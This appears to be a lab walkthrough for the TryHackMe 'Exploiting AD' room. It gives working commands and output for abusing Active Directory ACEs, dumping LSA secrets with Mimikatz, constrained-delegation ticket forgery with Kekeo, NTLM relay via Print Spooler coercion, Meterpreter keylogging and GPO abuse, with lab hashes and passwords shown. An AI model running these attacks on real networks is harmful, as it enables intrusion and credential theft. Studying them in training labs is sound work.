# Exploiting AD

## 1. Exploiting  Access Control Entries

A significant amount of ACEs can be misconfigured, and the exploits for each vary. The Bloodhound documentation assists in explaining enumerated ACEs and how they can be exploited. However, we will look at a couple of notable ones here:

* `ForceChangePassword`: We have the ability to set the user's current password without knowing their current password.
* `AddMembers`: We have the ability to add users (including our own account), groups or computers to the target group.
* `GenericAll`: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
* `GenericWrite`: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
* `WriteOwner`: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
* `WriteDACL`: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
* `AllExtendedRights`: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.

In order to exploit these ACEs, we will need a method to interact with AD to make these requests. The two best options for this are the AD-RSAT PowerShell cmdlets or PowerSploit. Depending on the breach and the detection tools in the environment, one option may be stealthier.

### 1.1 Privilege Escalation

If we search for our user account that was assigned in Task 1 in Bloodhound, we see that we don't have a lot of permissions. We have the ability to RDP into THMWRK1, but this will only provide us with low-privileged access.

![img](/img/ExploitingAD/1.png)

Since the domain is tiered, our first step will be to compromise Tier 2 infrastructure. We need to compromise the Tier 2 Admins group since this group has administrative privileges on all workstations. Let's ask Bloodhound if there is perhaps a road that we can follow to compromise this group. Add your user account as the start position and the Tier 2 Admins group as the end position.

![img](/img/ExploitingAD/2.png)

Bloodhound shows us a very interesting path. It seems that there was a slight bit of Permission Delegation in this domain. An administrator has misconfigured the Permission Delegation of the IT Support group by providing the Domain Users group with the `AddMembers` ACE. This means that any member of the Domain Users group (including our account) can add accounts to the IT Support Group. Furthermore, Bloodhound shows that the IT Support Group has the `ForceChangePassword` ACE for the Tier 2 Admins group members. This is not really a misconfiguration since Tier 2 admins are not that sensitive, but it provides a very potent attack path when combined with the initial misconfiguration. Let's exploit it!

#### **AddMember**

The first step in this attack path is to add our AD account to the IT Support group. We will use the Add-ADGroupMember PowerShell cmdlet from the AD-RSAT toolset for this.

```powershell
PS C:\>Add-ADGroupMember "IT Support" -Members "[Your.AD.Account.Username]"
```

We can verify that the command worked by using the `Get-ADGroupMember` cmdlet:

```powershell
PS C:\>Get-ADGroupMember -Identity "IT Support"
distinguishedName : CN=hugh.jones,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
name              : hugh.jones
objectClass       : user
objectGUID        : 460178d3-c818-4e28-9a39-b1ab2b0d3779
SamAccountName    : hugh.jones
SID               : S-1-5-21-3885271727-2693558621-2658995185-1113
```

If everything worked, you should see your account as a member.

#### **ForceChangePassword**

Now that we are a member of the IT Support group, we have inherited the `ForceChangePassword` Permission Delegation over the Tier 2 Admins group. First, we need to identify the members of this group to select a target. We can use the `Get-ADGroupMember` cmdlet again to assist with this:

```powershell
PS C:\>Get-ADGroupMember -Identity "Tier 2 Admins"
distinguishedName : CN=t2_lawrence.lewis,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_lawrence.lewis
objectClass       : user
objectGUID        : 4ca61b47-93c8-44d2-987d-eca30c69d828
SamAccountName    : t2_lawrence.lewis
SID               : S-1-5-21-3885271727-2693558621-2658995185-1893

[....]

distinguishedName : CN=t2_leon.francis,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_leon.francis
objectClass       : user
objectGUID        : 854b6d40-d537-4986-b586-c40950e0d5f9
SamAccountName    : t2_leon.francis
SID               : S-1-5-21-3885271727-2693558621-2658995185-3660
```

Make a note of the username of one of these accounts. We will use the `Set-ADAccountPassword` **AD-RSAT** cmdlet to force change the password:

```powershell
PS C:\>$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
PS C:\>Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password
```

>**Note:** If you get an Access Denied error, your permissions have not yet propagated through the domain. This can take up to 10 minutes. The best approach is to terminate your SSH or RDP session, take a quick break, and then reauthenticate and try again. You could also run `gpupdate /force` and then disconnect and reconnect, which in certain cases will cause the synchronisation to happen faster.

If this step worked, you should now be able to authenticate to THMWRK1 using this target account with its new password.

## 2 Kerberos Delegation

The practical use of Kerberos Delegation is to enable an application to access resources hosted on a different server. An example of this would be a web server that needs to access a SQL database hosted on the database server for the web application that it is hosting. Without delegation, we would probably use an AD service account and provide it with direct access to the database. When requests are made on the web application, the service account would be used to authenticate to the database and recover information.

However, we can allow this service account to be delegated to the SQL server service. Once a user logs into our web application, the service account will request access to the database on behalf of that user. This means that the user would only be able to access data in the database that they have the relevant permissions for without having to provide any database privileges or permissions to the service account itself.

### 2.1 Constrained vs Unconstrained

There are two types of Kerberos Delegation. In the original implementation of Kerberos Delegation, Unconstrained Delegation was used, which is the least secure method.  In essence, Unconstrained Delegation provides no limits to the delegation. In the background, if a user with the `TRUSTED_FOR_DELEGATION` flag set authenticates to a host with Unconstrained Delegation configured, a ticket-granting ticket (TGT) for that user account is generated and stored in memory so it can be used later if needed. Suppose an attacker can compromise a host that has Unconstrained Delegation enabled. In that case, they could attempt to force a privileged account to authenticate to the host, which would allow them to intercept the generated TGT and impersonate the privileged service. If you want to see an example of the exploitation of Unconstrained Delegation, have a [look here](https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976).

To combat the security failings of Unconstrained Delegation, Microsoft introduced Constrained Delegation in 2003. Constrained Delegation restricts what services an account can be delegated to, limiting exposure if an account is compromised. The following are examples of services that can be configured for delegation:

* **HTTP** - Used for web applications to allow pass-through authentication using AD credentials.
* **CIFS** - Common Internet File System is used for file sharing that allows delegation of users to shares.
* **LDAP** - Used to delegate to the LDAP service for actions such as resetting a user's password.
* **HOST** - Allows delegation of account for all activities on the host.
* **MSSQL** - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.

Exploiting Constrained Delegation is usually more complex than exploiting Unconstrained Delegation since the delegated account can't just be used for everything. However, it can still be used for some powerful exploitation. An example of this would be if we were able to compromise an AD account that had constrained delegation configured. By knowing the plaintext password or even just the NTLM hash of this account, we could generate a TGT for this account, then use the TGT to execute a ticket-granting server (TGS) request for any non-sensitive user account in order to access the service as that user. Imagine impersonating an account with access to a sensitive database, for example.

**Resource-Based Constrained Delegation:**

So there are actually three types of Kerberos Delegation. But this one deserves to be mentioned on its own. Introduced by Microsoft in 2012, Resource-Based Constrained Delegation (RBCD) once again provided additional restrictions on Kerberos Delegation for security. RBCD changes the delegation model entirely. Instead of specifying which object can delegate to which service, the service now specifies which objects can delegate to it. This allows the service owner to control who can access it. In our web application example, this means that instead of specifying that the web service account can delegate to the database service to access the database, we can now specify that on the database service that the web service account is allowed to delegate access to it.

*Let's say that we have permission to configure RBCD for a service. This means we have the ability to set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute for the AD Object. We can populate this attribute with the details of an AD account that we have access to. To now gain access to the service, we can generate a TGT for the account we control, which will allow us to interact with this service. If you want a detailed example of RBCD exploitation, take a [look here](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/).*

### 2.2 Constrained Delegation Exploitation

We will exploit Constrained Delegation for this task. The first thing we need to do is enumerate available delegations. Let's use our new privileged user for the network couple of commands. We can use the Get-NetUser cmdlet of PowerSploit for this enumeration by running the following command:

```powershell
PS C:\Users\phillip.wilkins> Import-Module C:\Tools\PowerView.ps1

PS C:\Users\phillip.wilkins> Get-NetUser -TrustedToAuth

logoncount               : 33
badpasswordtime          : 1/1/1601 12:00:00 AM
whenchanged              : 10/14/2025 3:56:56 PM
instancetype             : 4
usncreated               : 78494
objectguid               : 11e42287-0a25-4d73-800d-b62e2d2a2a4b
sn                       : Server
lastlogoff               : 1/1/1601 12:00:00 AM
msds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1,
                           http/THMSERVER1.za.tryhackme.loc, http/THMSERVER1}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dscorepropagationdata    : 1/1/1601 12:00:00 AM
serviceprincipalname     : HTTP/svcServWeb.za.tryhackme.loc
givenname                : IIS
lastlogon                : 10/14/2025 4:56:56 PM
badpwdcount              : 0
cn                       : IIS Server
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated              : 4/27/2022 11:26:21 AM
primarygroupid           : 513
pwdlastset               : 4/29/2022 11:50:25 AM
usnchanged               : 172095
```

Based on the output of this command, we can see that the svcIIS account can delegate the HTTP and WSMAN services on THMSERVER1. You would think that this means we can only access websites on behalf of impersonated users. However, PowerShell Remoting uses the HTTP and WSMAN services as well. The ideal option would be to impersonate a Tier 1 Admin since this would provide us with administrative access over THMSERVER1.

If you were to perform proper post-exploitation enumeration of THMWRK1, you would find that there is a service on the host running as the svcIIS user. Since we have administrative access now, we can use this to dump LSASecrets, part of the Windows Registry Hive where credentials are stored for features such as Windows services. Let's use **Mimikatz** to dump the secrets:

```mimikatz
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\t2_robin.wyatt@THMWRK1 C:\Users\t2_robin.wyatt>C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53              
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                               
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                   
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 

mimikatz # token::elevate  
Token Id  : 0                   
User name :                     
SID name  : NT AUTHORITY\SYSTEM 

492     {0;000003e7} 1 D 16827          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary                                         
 -> Impersonated !                                                                                                                              
 * Process Token : {0;00227f88} 0 D 2692040     ZA\t2_robin.wyatt       S-1-5-21-3885271727-2693558621-2658995185-5409  (12g,24p)       Primary 
 * Thread Token  : {0;000003e7} 1 D 2873036     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)              
                                                                                                                                                
mimikatz # lsadump::secrets                                                                                                                     
Domain : THMWRK1                                                  
SysKey : a1403e57976b472bce5f231922ca3942                         
                                                                  
Local name : THMWRK1 ( S-1-5-21-3226461851-763325627-4205969673 ) 
Domain name : ZA ( S-1-5-21-3885271727-2693558621-2658995185 )    
Domain FQDN : za.tryhackme.loc                                    
                                                                  
Policy subsystem is : 1.18                                        
LSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27}    
  [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463                     
                                                                                                                                   
Secret  : $MACHINE.ACC                                                                                                             
cur/text: 0FFIKa"c[#L6T>=.s*ZW'Gz04FL&7,"VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP 
    NTLM:4207d1b7e4b942da2371174b772fdf5e                                                                                          
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db                                                                                  
old/text: 0FFIKa"c[#L6T>=.s*ZW'Gz04FL&7,"VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP 
    NTLM:4207d1b7e4b942da2371174b772fdf5e                                                                                          
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db 

Secret  : DefaultPassword
old/text: vagrant

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 b6 54 c4 83 d9 88 10 f6 ee ae fc b7 ed 2d a2 d6 47 11 3f 8f 4a 6d 7f 72 35 b8 a2 93 3d 5c 5e 3f 03 8d 79 49 90 e7 2e e0  
    full: b654c483d98810f6eeaefcb7ed2da2d647113f8f4a6d7f7235b8a2933d5c5e3f038d794990e72ee0
    m/u : b654c483d98810f6eeaefcb7ed2da2d647113f8f / 4a6d7f7235b8a2933d5c5e3f038d794990e72ee0 
old/hex : 01 00 00 00 10 4d a3 82 e2 da 30 1f 33 d6 49 a4 c9 81 26 e5 25 59 bb 9f 8a 76 b1 5d 59 c6 87 c6 32 b7 02 0b c1 5b 24 f4 44 d0 74 31
    full: 104da382e2da301f33d649a4c98126e52559bb9f8a76b15d59c687c632b7020bc15b24f444d07431 
    m/u : 104da382e2da301f33d649a4c98126e52559bb9f / 8a76b15d59c687c632b7020bc15b24f444d07431

Secret  : NL$KM
cur/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 99 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 99 ff 97 ec 7f 49 a1 79 15 d
9 a0 04 ac 58
old/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 99 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 99 ff 97 ec 7f 49 a1 79 15 d
9 a0 04 ac 58

Secret  : _SC_thmwinauth / service 'thmwinauth' with username : svcIIS@za.tryhackme.loc
cur/text: Password1@

mimikatz # exit
Bye!

```

Now that we have access to the password associated with the svcIIS account, we can perform a Kerberos delegation attack. We will use a combination of Kekeo and Mimikatz. You can use another window for Mimikatz, but make sure to exit out of Mimikatz after the `token::elevate` command, otherwise the tickets will be loaded in the wrong context later on. We will use [Kekeo](https://github.com/gentilkiwi/kekeo) to generate our tickets and then use Mimikatz to load those tickets into memory. Let's start by generating the tickets:

We first need to generate a TGT that can be used to generate tickets for the HTTP and WSMAN services:

```kekeo
za\t2_robin.wyatt@THMWRK1 C:\Users\t2_robin.wyatt>C:\Tools\kekeo\x64\kekeo.exe

  ___ _    kekeo 2.1 (x64) built on Dec 14 2021 11:51:55
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  L\_       https://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with 10 modules * * */

kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@  
Realm        : za.tryhackme.loc (za) 
User         : svcIIS (svcIIS)
CName        : svcIIS   [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 43460d636f269c709b20049cee36ae7a 
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.72.101 (auto)
  > Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'
```

Now that we have the TGT for the account that can perform delegation, we can forge TGS requests for the account we want to impersonate. We need to perform this for both HTTP and WSMAN to allow us to create a PSSession on THMSERVER1:

```kekeo
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
Ticket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC
  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [enc-krb-cred] T: [10/30/2025 11:51:30 AM ; 10/30/2025 9:51:30 PM] {R:11/6/2025 11:51:30 AM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): ea9c0a50ac7916d203c0a27d9877c11adb5b2cb5950d140f3d2dafd85d77b761
  [s4u2self]  t1_trevor.jones
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.72.101 (auto)
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi'
Service(s):
  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'
```

```kekeo
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc
Ticket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC
  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [enc-krb-cred] T: [10/30/2025 11:51:30 AM ; 10/30/2025 9:51:30 PM] {R:11/6/2025 11:51:30 AM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): ea9c0a50ac7916d203c0a27d9877c11adb5b2cb5950d140f3d2dafd85d77b761
  [s4u2self]  t1_trevor.jones
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.72.101 (auto)
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi'
Service(s):
  [s4u2proxy] wsman/THMSERVER1.za.tryhackme.loc
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

kekeo # exit
Bye!
```

Now that we have the two TGS tickets, we can use Mimikatz to import them:

```mimikatz
za\t2_robin.wyatt@THMWRK1 C:\Users\t2_robin.wyatt> C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK

mimikatz # exit
Bye!
```

You can exit Mimikatz and run klist if you want to verify that the tickets were imported. Now that the tickets are imported, we can finally create our PSSession on THMSERVER1:

```powershell
PS C:\Users\t2_robin.wyatt> New-PSSession -ComputerName thmserver1.za.tryhackme.loc

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          thmserver1.z... RemoteMachine   Opened        Microsoft.PowerShell     Available


PS C:\Users\t2_robin.wyatt> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents> whoami
za\t1_trevor.jones  
```

## 3. Exploiting Automated Relays

In this task we will take a look at some automated relays. Authentication attempts are constantly flying across the network, and as shown in the Breaching AD room, if we are lucky, we can intercept some of these challenges to gain access. But what if we don't like to wait? What if we can coerce authentication to occur?

**Goal:**
Coerce a machine account (machine A) to authenticate to your attacker SMB server using the Print Spooler (MS-RPRN) and relay that authentication to a target machine (machine B) where A has `AdminTo`. Result: execute commands / dump hashes as `NT AUTHORITY\SYSTEM` on the target.

```diagram
          SpoolSample abuse
     ┌──────────────────────────┐
     │                          ▼
Machine A  ── SMB auth ──>  Attack SMB Listener (ntlmrelayx)
 (coerced)                       │
                                 ▼  (relay NTLM)
                           Machine B (AdminTo target)
                                 │
                               SYSTEM
                                 │
                          run command / dump hashes
```

### 3.1 Recon — find machine→machine admin relationships

Use BloodHound to hunt for computer accounts that have administrative rights over other computers.

**Custom Cypher (BloodHound Analysis → Create Custom Query):**

```cypher
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
```

**What you want:** paths where `THMSERVER2$` (or similar) has `AdminTo` on `THMSERVER1$`. Note the source machine (the coercer) and target machine (the relay target).

### 3.2 Preconditions (must all be true)

1. **Valid AD credentials** (any domain account you can use to trigger the spooler RPC call).
2. **Network connectivity to target SMB (TCP/445)** from your attacker VM (and to the host you’ll coerce).
3. **Target host’s Print Spooler service is running.**
4. **SMB signing is NOT enforced** on target (allowed but not required is exploitable).

### 3.3 Verify spooler + SMB signing (practical commands)

#### Check Print Spooler remotely (from a Windows host you control — e.g., THMWRK1)

PowerShell (run from a host with network access to the coerced machine):

```powershell
# quick check of installed printers (indicates Print Spooler running)
Get-WmiObject Win32_Printer -ComputerName thmserver2.za.tryhackme.loc
# or (newer)
Get-Printer -ComputerName thmserver2.za.tryhackme.loc
```

**Successful output**: lists printers / `SystemName` entries. Access denied may mean restricted WMI; absence of output is not definitive.

### Check SMB signing (from your AttackBox / Linux)

Use Nmap script:

```bash
nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
```

**Look for:**
`Message signing enabled but not required` → exploitable.
`Message signing required` or `Domain: signing_required` → relay will fail.

### 3.4 Setup NTLM relay listener (on attacker VM)

Use Impacket’s `ntlmrelayx.py`. Use the **target IP** (not hostname) to avoid Kerberos.

Example — basic relay to SMB with SMBv2 support:

```bash
# Requires impacket (updated) and Python3.9+ on AttackBox
python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://172.31.1.201 -debug
```

* `-smb2support` helps when target negotiates SMBv2.
* Use `-c 'whoami /all'` to execute a command after relaying, or omit to attempt credential extraction.

**Expected behavior:** listener prints “Servers started, waiting for connections” and later shows `Received connection from <coercer IP>, attacking target smb://<target IP>` and `Authenticating against smb://<target IP> as <DOMAIN>/<MACHINE$> SUCCEED`.

### 3.5 Coerce authentication using SpoolSample (from the machine that can reach the coerced host)

On the host that has the rights to contact the coerced machine (or on a writable host in the lab), run the provided SpoolSample compiled binary:

```powershell
# on THMWRK1 (or wherever SpoolSample.exe is located)
C:\Tools\SpoolSample.exe THMSERVER2.za.tryhackme.loc 10.10.14.5
# or with named args if binary supports them:
# SpoolSample.exe <victim-hostname> <attacker-ip>
```

* `<victim-hostname>`: the host that will be coerced (the one running Print Spooler).
* `<attacker-ip>`: your AttackBox/TUNX IP where `ntlmrelayx` is listening.

**What happens:** SpoolSample abuses MS-RPRN to instruct the victim to authenticate to your SMB server. The victim’s machine account `THMSERVER2$` (or its user context) will attempt NTLM auth to your listener.

### 3.6 Relay success & post-exploitation

If successful, `ntlmrelayx` will display a successful authentication and then will attempt the specified action (command execution, SMB session, hashdump).

Example successful output snippet:

```powershell
[*] SMBD-Thread-5: Received connection from 172.31.1.202, attacking target smb://172.31.1.201
[*] Authenticating against smb://172.31.1.201 as ZA/THMSERVER2$ SUCCEED
[+] ExecuteRemote command: %COMSPEC% /Q /c echo whoami /all ...
[*] Executed specified command on host: 172.31.1.201

USER INFORMATION
----------------
User Name           SID
=================== ========
nt authority\system S-1-5-18
...
```

* If you used `-c` to run `whoami /all`, you should see `NT AUTHORITY\SYSTEM`.
* Without `-c`, `ntlmrelayx` often attempts a hashdump or smbexec to spawn a shell.

### 3.7 Troubleshooting (common failures)

* **No callback:** verify network reachability and IP (use ICMP/TCP connect to 445), firewall rules, and that you used correct attacker interface IP (tunX).
* **SMB signing enforced:** Nmap shows signing required → relay will fail. Look for other targets or privilege paths.
* **Spooler crashes / unstable:** Print Spooler exploitation is flaky in labs; try again or continue without it.
* **Kerberos negotiation instead of NTLM:** use target IP in `ntlmrelayx` and avoid specifying hostnames.
* **Impacket errors:** upgrade to latest Impacket; ensure Python version (3.9+) and `-smb2support` flag for SMBv2.
* **Access denied when checking spooler remotely:** try from a host in the same segment as coerced machine (WMI restrictions exist).

---

## 4. Exploiting AD Users

When you already control multiple systems in an AD environment, the next escalation step is targeting users. Machines follow rules; humans don’t. Credential storage and keystroke capture are the two most reliable angles.

### 4.1 **Credential Hunting**

During post-exploitation, inspect user directories for anything sensitive: password managers, notes, config files, browser creds.
If you find a password manager database like a `.kdbx` file, download it for analysis.

**Meterpreter download:**
`meterpreter> download C:\\Users\\<user>\\path\\file.kdbx`

Brute-forcing the database is usually pointless. The smarter move is to catch the user typing the master password.

### 4.2 **Keylogging (Requires User Context)**

A keylogger under SYSTEM is blind to real user keystrokes. Migrate your session into a user-owned process—typically `explorer.exe`, since it only exists when the user is actively logged in.

**Workflow & Commands:**

1. **List processes and find a user session:**
   `meterpreter> ps`
   Filter if needed:
   `meterpreter> ps | grep explorer`

2. **Migrate into the user process:**
   `meterpreter> migrate <PID>`

3. **Verify context:**
   `meterpreter> getuid`

4. **Start keystroke capture:**
   `meterpreter> keyscan_start`

5. **Dump captured keys after waiting:**
   `meterpreter> keyscan_dump`

Captured keystrokes often reveal the password manager’s master password or other credentials the user types.

### 4.3 **Password Manager Extraction**

Once you have the master password, open the downloaded `.kdbx` file in your own environment and pull the stored credentials. These frequently include domain user passwords, service accounts, administrative entries, or legacy creds users forgot they saved.

### 4.4 **Optional Persistence**

If long-term access is desired, you can quietly create a local admin user. This isn’t required for user-targeting but is part of maintaining a foothold.

This is the core pattern: compromise the machine, pivot into user context, observe behavior, harvest credentials. Humans remain the biggest attack surface, and Meterpreter provides the tools to turn their habits into access.

---

## 5. Exploiting GPOs

Keylogging enabled the decryption of the user’s credential vault and allowed us to recover several credentials, including `svcServMan`. Before using it for any AD activity, we should verify what this account can actually do. With the Sharphound data already collected, we can use BloodHound’s search to check the account’s permissions.

![img](/img/ExploitingAD/3.png)

One permission, in particular, stands out for this account, ownership over a Group Policy Object (GPO). Furthermore, when we do a bit of investigation, it seems like this GPO is applied to our THMSERVER2 machine:

![img](/img/ExploitingAD/4.png)

This may provide us with the ideal opportunity to further our AD exploitation!

### 5.1 **Context**

**Group Policy Objects:**

Earlier, when looking at the SYSVOL directory during Active Directory enumeration, we noted that this directory stores the Group Policy Objects (GPOs) that need to be replicated to all domain-joined machines. A GPO is essentially a virtual bundle of configuration settings. Each GPO is identified by a unique GUID, which explains why the contents of SYSVOL appear to be random strings when viewed directly.

Every Windows system also maintains its own Local Policy configuration. This local policy defines several important settings, including:

* Application rules for components like the firewall, antivirus, and AppLocker
* Local group memberships such as Administrators or Remote Desktop Users
* Startup-related behavior, including scripts that run at boot
* Security and protocol configurations, such as SMBv1 support

These examples barely scratch the surface—the number of configurable settings is very large.

**Group Policy Management:**

On a single machine, managing local policy is straightforward. In larger environments, however, manually configuring every system is inefficient and error-prone. Group Policy Management (GPM) solves this by enabling administrators to define and deploy policies centrally within Active Directory. Policies can be assigned to various AD objects, such as specific OUs or security groups.

Domain-joined machines periodically retrieve the latest policies from SYSVOL and apply the ones relevant to them. By default, this synchronization occurs every 15 minutes using the `gpupdate` process, but policies can also be applied immediately using a manual `gpupdate` command from the Command Prompt.

### 5.2 **The Exploitation**

While there are multiple ways to abuse GPOs, we’ll focus on a straightforward approach: adding an Active Directory account we control to the local Administrators and Remote Desktop Users groups. This grants us administrative privileges on **THMSERVER2** and enables RDP access. Although SSH is exposed, most organizations haven’t fully adopted SSH for Windows systems, so RDP or more traditional lateral movement tools like **SMBExec** remain the more practical choices.

To modify the GPO, we must use Group Policy Management under an AD account with the required permissions. RDPing directly into **THMSERVER1** as that user risks disconnecting the user’s active session, which could draw attention. Instead, we connect to **THMWRK1** using either our standard account or our Tier 2 Admin account, load the target AD user’s credentials into memory via the `runas` command, and then launch the Microsoft Management Console (MMC) to adjust the GPO safely.

```cmd
C:\>runas /netonly /user:za.tryhackme.loc\<AD Username> cmd.exe
```

Once prompted, provide the password associated with the account. To verify that you provided the correct credentials, you can run `dir \\za.tryhackme.loc\sysvol`. In the newly spawned command prompt window, we can start the Microsoft Management Console:

```cmd
C:\>mmc
```

We now want to add the Group Policy Management snap-in:

 1. Click **File -> Add/Remove Snap-in**
 2. Select the **Group Policy Management** snap-in and click **Add**
 3. Click **Ok**

You should now be able to see GPOs for the za.tryhackme.com domain:

![img](/img/ExploitingAD/5.png)

